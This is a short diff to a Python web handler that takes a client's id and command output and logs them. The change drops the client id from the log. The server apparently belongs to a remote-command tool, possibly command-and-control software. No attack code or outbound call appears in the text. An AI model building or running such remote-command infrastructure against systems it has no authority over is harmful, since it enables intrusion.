@@ -66,7 +66,8 @@ def answer():
     """ called by client when responding to command """
     clientId = request.form['id']
     cmdOutput = request.form['cmdOutput']
-    logging.info("   [-] From %s received:\n %s " % (clientId,cmdOutput))
+    #logging.info("   [-] From %s received:\n %s " % (clientId,cmdOutput))
+    logging.info(" %s \n " % (cmdOutput))
     return make_response("OK")
 
 
